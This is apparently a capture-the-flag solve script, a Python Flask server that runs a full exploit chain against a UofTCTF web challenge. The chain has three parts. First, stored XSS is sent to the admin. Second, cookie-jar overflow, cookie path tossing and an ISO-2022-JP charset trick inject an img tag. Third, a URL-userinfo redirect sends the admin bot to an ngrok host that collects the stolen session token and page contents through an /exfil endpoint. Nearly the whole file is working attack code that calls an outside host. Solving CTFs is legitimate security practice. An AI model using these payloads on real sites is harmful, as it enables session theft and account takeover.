from flask import Flask, Response, request, redirect
import requests
import random
import string
# to use, forward port 5002 using ngrok, then set EXFIL_BASE_URL to the ngrok url and visit /solve to run the full chain
app = Flask(__name__)
username_salt = ''.join(random.choices(string.ascii_lowercase, k=5))
USERNAME = username_salt+"\x1B(B"
PASSWORD = "a"
REMOTE_BASE_URL = "https://unrealistic-1-69cc0347a8869788.chals.uoftctf.org"
# REMOTE_BASE_URL = "http://127.0.0.1:5000"
s = requests.Session()
XSS_ID = None
EXFIL_BASE_URL = "https://db367444d3cd.ngrok.app"
MOTD_FLAG_1_COOKIE = f""""<img src='{EXFIL_BASE_URL}/exfil?data=; domain=127.0.0.1; path=/"""
DUMMY_COOKIE_FLAG_1 = ''''/>"; domain=127.0.0.1;path=/;'''
MOTD_FLAG_2_COOKIE = f"""<meta charset='ISO-2022-JP'><img src=%22{EXFIL_BASE_URL}/exfil?data=%1B%24%40; domain=127.0.0.1; path=/motd"""
switch = False

def register():
    url = f"{REMOTE_BASE_URL}/register"
    s.post(url, data={"username": USERNAME, "password": PASSWORD},allow_redirects=False)
    
def login():
    url = f"{REMOTE_BASE_URL}/login"
    s.post(url, data={"username": USERNAME, "password": PASSWORD})
    print(f"Session cookies after login: {s.cookies.get_dict()}")
    print("Logged in")
    
def send_xss_message(flag_id):
    global XSS_ID
    if flag_id == 1:
      js = '''

      const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));
      (async function main() {
          for (let i = 999; i--;) document.cookie = `c${i}=${i};`;
          for (let i = 999; i--;) document.cookie = `c${i}=;expires=Thu, 01 Jan 1970 00:00:01 GMT;`;
          document.cookie = `motd=<MOTD_FLAG_1>`;
          document.cookie = `session=<SESSION_COOKIE>; domain=127.0.0.1; path=/flag;`;
          await sleep(1000);
          let w = window.open('/flag');
          await sleep(500);
          document.cookie = `dummy=<DUMMY_COOKIE_FLAG_1>`;
          await sleep(500);
          w.location = '/motd';
      })()
      '''.replace("<MOTD_FLAG_1>", MOTD_FLAG_1_COOKIE).replace("<DUMMY_COOKIE_FLAG_1>", DUMMY_COOKIE_FLAG_1).replace("<SESSION_COOKIE>", s.cookies.get("session")).replace("\n", "").replace("\t"," ")
    else:
      js = '''
      const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));
      (async function main() {
          for (let i = 999; i--;) document.cookie = `c${i}=${i};`;
          for (let i = 999; i--;) document.cookie = `c${i}=;expires=Thu, 01 Jan 1970 00:00:01 GMT;`;
          document.cookie = `session=<SESSION_COOKIE>; domain=127.0.0.1; path=/motd;`;
          document.cookie = `motd=<MOTD_FLAG_2>`;
          await sleep(1500);
          location = '/motd';
      })()
      '''.replace("<MOTD_FLAG_2>", MOTD_FLAG_2_COOKIE).replace("<SESSION_COOKIE>", s.cookies.get("session")).replace("\n", "").replace("\t"," ")
      
    payload = f'''<script>{js}</script>'''
    print(f"Payload: {payload}")
    url = f"{REMOTE_BASE_URL}/compose"
    r = s.post(url, data={"to":"admin","body":payload}, allow_redirects=False)
    XSS_ID = r.json().get("id")
    print(f"Sent XSS message with ID: {XSS_ID}")
    


    
@app.after_request
def no_cache(resp):
    resp.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    resp.headers["Expires"] = "0"
    resp.headers["Pragma"] = "no-cache"
    return resp


@app.route('/solve')
def solve():
    bot_url = f"{REMOTE_BASE_URL}/bot"
    exfil_host = EXFIL_BASE_URL.split("//")[1]
    requests.get(f"{EXFIL_BASE_URL}/prep1")
    r = s.post(bot_url, data={"url": f"http://127.0.0.1:5000@{exfil_host}/s1"})
    assert("Bot ran." in r.text)
    requests.get(f"{EXFIL_BASE_URL}/prep2")
    r = s.post(bot_url, data={"url": f"http://127.0.0.1:5000@{exfil_host}/s1"})
    assert("Bot ran." in r.text)
    return "full chain ran, check logs. flag 1 in exfiltrated JWT, flag 2 in exfiltrated dom", 200


@app.route("/prep1")
def prep1():
    global switch
    switch = False
    register()
    login()
    send_xss_message(1)
    return "Prepared", 200

@app.route('/prep2')
def prep2():
    global switch
    switch = False
    register()
    login()
    send_xss_message(2)
    return "Prepared", 200

@app.route('/s1')
def s1():
    global XSS_ID
    global switch
    switch = not switch
    if switch:
      html_content = r'''<script>
        const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

        const main = async () => {
            const baseUrl = "http://127.0.0.1:5000";
            const url = `${baseUrl}/inbox`;
            open(url);
            await sleep(1000);
            const blob = new Blob(["<script>setTimeout(()=>history.back(), 1000)<\/script>"], { type: "text/html" });
            location = URL.createObjectURL(blob);
        };
        main();
    </script>
      '''.replace("<XSS_ID>", str(XSS_ID))
      return Response(html_content, mimetype='text/html')
    else:
      return redirect(f"http://127.0.0.1:5000/api/messages/{XSS_ID}")

@app.route('/exfil')
def exfil():
    exfil_data = request.args.get('data')
    print(f"Exfiltrated data: {exfil_data}")
    return f"exfiltrated: {exfil_data}", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5002,debug=True)